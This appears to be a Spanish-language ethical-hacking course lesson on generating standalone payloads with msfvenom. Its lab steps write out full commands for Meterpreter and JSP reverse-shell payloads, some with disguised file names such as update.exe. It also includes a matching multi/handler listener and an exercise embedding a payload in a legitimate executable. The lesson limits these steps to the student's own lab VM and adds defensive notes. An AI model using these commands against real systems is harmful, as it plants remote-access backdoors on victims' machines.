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075 — msfvenom: generación de payloads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aprenderá a generar payloads independientes con msfvenom en múltiples formatos y plataformas (ejecutables Windows, binarios Linux, scripts web, one-liners de PowerShell), comprenderá el…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payloads standalone para Windows, Linux y aplicaciones web usando msfvenom.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correctamente formato de salida, arquitectura y tipo de payload según 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LHOST/LPORT y recibir la sesión resultante con exploit/multi/handler.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encoders e iteraciones, y explicar honestamente por qué no constituyen una evasión de antivirus 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payloads staged y stageless y elegir el handler correspondiente sin errores.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Incrustar un payload en una plantilla ejecutable legítima usando -x y -k.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 comando msfvenom (-p, -f, -o, LHOST, LPORT)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Formatos de salida (-f): exe, elf, raw, psh, war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Listado de payloads y formatos disponibles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Encoders (-e, -i) y sus límites reales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Plantillas (-x, -k)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exploit/multi/handler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Bad characters (-b)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todo acceso viene de explotar un servicio de red. Muchas veces el vector es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alguien ejecute un fichero: un adjunto de phishing, un binario dejado tras un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inicial, una macro. msfvenom es la herramienta de Metasploit para fabricar ese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fichero: genera un payload autónomo, en el formato que necesite el objetivo, listo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ejecutarse y conectar de vuelta al handler. Es el puente entre "tengo un payload" y "tengo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artefacto que puedo entregar".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 sintaxis es un patrón que se repite en todas las variantes, y memorizarlo ahorra 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msfvenom: herramienta de línea de comandos que fusiona las antiguas msfpayload y msfencode, generando payloads standalone ejecutables fuera de msfconsole. Característica clave: produce artefactos…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Formato de salida (-f): contenedor final del payload (exe, elf, raw, psh-cmd, war, apk, entre otros). Característica clave: debe coincidir exactamente con el mecanismo de ejecución previsto en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Encoder: transforma la representación del payload para evitar bad characters o introducir variación superficial en la firma binaria. Característica clave: no es una técnica de evasión de antivirus…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(-x): ejecutable legítimo preexistente en el que se inyecta el payload generado. Característica clave: la opción -k intenta preservar la funcionalidad original del ejecutable mientras corre…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Bad characters (-b): bytes que deben evitarse en el payload generado porque rompen la ejecución en un contexto de explotación específico (por ejemplo \x00 en buffers basados en strings terminadas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exploit/multi/handler: módulo genérico de Metasploit que actúa como listener para cualquier payload standalone generado con msfvenom. Característica clave: la configuración del handler (tipo de…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msfvenom — Generador de payloads autónomos de Metasploit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-p — Selecciona el payload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LHOST / LPORT — Dirección y puerto de vuelta al handler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-f (formato) — Envoltorio de salida: exe, elf, apk, psh, war, raw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-o — Fichero de salida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Artefacto — Fichero generado listo para entregar o ejecutar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Metasploit Framework (incluye msfvenom) en Kali Linux o Parrot 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Listar payloads y formatos disponibles antes de empezar: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VM de laboratorio propia (Windows o Linux) donde el propio alumno ejecutará el artefacto generado, simulando la entrega sin involucrar a terceros ni técnicas de ingeniería social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Espacio de almacenamiento local aislado para los binarios generados (nunca subirlos a servicios de análisis públicos).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Atacante Kali con IP 192.168.56.10 (ajustar según tu red de laboratorio).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payload Meterpreter reverse para Windows en formato ejecutable: msfvenom -p windows/x64/meterpreter/reversetcp LHOST=192.168.56.10 LPORT=4444 -f exe -o /tmp/update.exe.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el equivalente para Linux en formato ELF: msfvenom -p linux/x64/meterpreter/reversetcp LHOST=192.168.56.10 LPORT=4444 -f elf -o /tmp/backup.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one-liner de PowerShell para escenarios donde no se puede subir un ejecutable: msfvenom -p windows/x64/meterpreter/reversetcp LHOST=192.168.56.10 LPORT=4444 -f psh-cmd.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payload web para un servidor Tomcat de laboratorio: msfvenom -p java/jspshellreversetcp LHOST=192.168.56.10 LPORT=4444 -f war -o /tmp/shell.war.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payload con encoder e iteraciones, con fines exclusivamente didácticos para observar el efecto (no de evasión real): msfvenom -p windows/meterpreter/reversetcp LHOST=192.168.56.10…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el handler correspondiente en msfconsole: use exploit/multi/handler, set PAYLOAD windows/x64/meterpreter/reversetcp, set LHOST 192.168.56.10, set LPORT 4444, exploit -j.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el mismo payload en formato exe y en formato raw, y explica en qué escenario usarías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payload evitando bytes específicos con -b '\x00\x0a' y justifica por qué se evitarían esos bytes en un contexto de explotación de buffer.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Incrusta un payload en un ejecutable legítimo de tu laboratorio usando -x y -k, y comprueba que ambas funcionalidades (la original y el payload) siguen operativas.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Explica, con fundamento técnico, por qué el encoder shikataganai ya no evade antivirus modernos con detección heurística.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one-liner de PowerShell y descompón, paso a paso, qué hace cada segmento del comando resultante.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handler que coincida con un payload staged y otro que coincida con uno stageless, documentando la diferencia exacta en la nomenclatura de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Desde la óptica defensiva, documenta qué regla de EDR o de hash (ej. detección por comportamiento de proceso hijo inesperado) permitiría bloquear la ejecución del payload generado en el ejercicio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Generar un payload con msfvenom, entregarlo únicamente en la VM de laboratorio propia, y obtener la sesión correspondiente en el handler configurado.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artefacto se genera con LHOST/LPORT correctos y documentados; el handler en msfconsole usa exactamente el mismo tipo de payload (misma arquitectura, mismo formato…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handler nunca recibe la conexión — El payload configurado en el handler no coincide exactamente con el generado (arquitectura o staged/stageless distintos); deben ser idénticos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encoder succeeded" al generar el payload — Combinación de bad chars imposible de resolver o payload demasiado grande tras el encoding; reducir la lista de -b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ejecutable es detectado y eliminado por el antivirus del laboratorio — Comportamiento esperado y correcto; los encoders de msfvenom no están diseñados para evadir AV moderno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payload Linux no se ejecuta tras transferirlo — Falta el permiso de ejecución; aplicar chmod +x antes de ejecutar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generó para arquitectura equivocada (x86 en un sistema x64) — Verificar la arquitectura del objetivo y usar el payload correspondiente, ej. windows/x64/...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binario troyanizado con -x deja de funcionar como el original — Falta la opción -k, que preserva la ejecución del binario original en un hilo separado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payload web (.war) no se despliega en el servidor de laboratorio — Falta reiniciar el servicio de aplicaciones o el archivo no tiene el nombre/ruta esperada por el auto-deploy; revisar logs del…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encoders de msfvenom evaden antivirus modernos?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 forma fiable. Encoders como shikataganai fueron diseñados originalmente para evitar bad characters en contextos de explotación, no para evadir motores de antivirus con heurística y análisis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distingo un payload staged de uno stageless en msfvenom?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la nomenclatura: un payload como windows/meterpreter/reversetcp (con / antes de reversetcp) es staged, mientras que windows/meterpreterreversetcp (con  uniendo meterpreter y reversetcp) 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subir el payload generado a VirusTotal para probar si es detectado?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ni siquiera en laboratorio. Servicios como VirusTotal comparten las muestras enviadas con proveedores de antivirus y terceros, lo que podría filtrar tu artefacto o, en un engagement real, alertar…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formato de payload uso para una aplicación web Java vulnerable en laboratorio?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Kim, P. "The Hacker Playbook 3" (2018) — capítulo sobre generación y entrega de payloads.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Weidman, G. "Penetration Testing: A Hands-On Introduction to Hacking" (No Starch Press, 2014) — fundamentos de payloads y shells.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Offensive Security, documentación de msfvenom: &lt;https://www.offsec.com/metasploit-unleashed/msfvenom/&gt;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Rapid7, documentación oficial de Metasploit sobre msfvenom: &lt;https://docs.metasploit.com/&gt;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técnica T1027 (Obfuscated Files or Information) como contexto defensivo de encoders: &lt;https://attack.mitre.org/techniques/T1027/&gt;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técnica T1071 (Application Layer Protocol) para el tráfico de comando y control de un handler: &lt;https://attack.mitre.org/techniques/T1071/&gt;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ee4bb67c8702b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26664"/>
            <a:ext cx="8229600" cy="14447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